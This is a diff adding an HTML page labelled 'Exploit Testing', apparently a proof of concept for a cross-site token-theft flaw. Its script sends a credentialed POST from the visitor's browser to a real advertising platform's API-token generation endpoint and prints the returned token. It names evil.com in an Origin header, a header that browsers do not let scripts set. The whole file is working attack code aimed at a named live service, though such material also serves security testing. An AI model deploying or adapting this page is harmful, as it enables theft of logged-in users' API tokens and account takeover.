@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Exploit Testing…</h1>
+
+<script>
+fetch("https://advertiser.trafficjunky.com/member/generate-api-token", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+        "Origin": "https://evil.com",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+})
+.then(r => r.text())
+.then(d => console.log("TOKEN:", d));
+</script>
+</body>
+</html>
